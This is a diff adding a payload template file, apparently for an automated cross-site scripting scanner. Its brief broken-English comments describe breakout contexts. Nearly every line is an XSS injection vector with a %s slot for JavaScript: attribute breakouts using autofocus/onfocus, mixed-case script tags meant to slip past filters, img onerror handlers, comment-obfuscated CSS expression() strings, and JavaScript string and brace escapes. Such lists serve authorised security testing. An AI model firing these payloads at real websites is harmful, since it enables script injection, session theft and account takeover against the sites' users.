@@ -1,0 +1,36 @@
+#comment, these are html without javascirpt which is stored in other files
+#next, payload totally ramdon, not just '12'
+#
+#'style=x:exp/**/re/**/ssion(window.a==1?1:%s;a=1) var='
+#"style=x:exp/**/re/**/ssion(window.a==1?1:%s;a=1) var="
+"autofocus=""onfocus=%s var="
+'autofocus=''onfocus=%s var='
+"autofocus=""onfocus="%s"var="
+'autofocus=''onfocus='%s'var='
+#with *noton in the end, means it does not need to  tranfer the javascirpt payload to html charater
+"><sCRipt>%s</sCrIpt><kid var="*noton
+'><sCRipt>%s</sCrIpT><kid var='*noton
+"><input type=text autofocus onfocus=%s><input var="
+'><input type=text autofocus onfocus=%s><input var='
+"><imG src="pigdog"onerror=%s><kid var="
+'><iMg src='pigdog'onerror=%s><kid var='
+#"><input type=text style=x:exp/**/re/**/ssion(window.a==1?1:%s;a=1)><input var="
+#'><input type=text style=x:exp/**/re/**/ssion(window.a==1?1:%s;a=1)><input var='
+";{%s}var a="*noton
+";{%s}//*noton
+',false);{%s}//*noton
+",false);{%s}//*noton
+');{%s}//*noton
+");{%s}//*noton
+';{%s}var a='*noton
+';{%s}//*noton
+"}{%s}{//*noton
+'}{%s}{//*noton
+"}}{%s}{{//*noton
+'}}{%s}{{//*noton
+1'</br><sCRipt kid=>%s</sCrIpT>*noton
+";}),''};{%s}function test(){smc.post( function (json) {//*noton
+"'"></iframe><ScRipt>%s</ScRipt><kid var="*noton
+"'"></input>"<ScRipt>%s</ScRipt><kid var="*noton
+"'"></a></ScRipt><ScRipt>%s</ScRipt><kid var="*noton
+
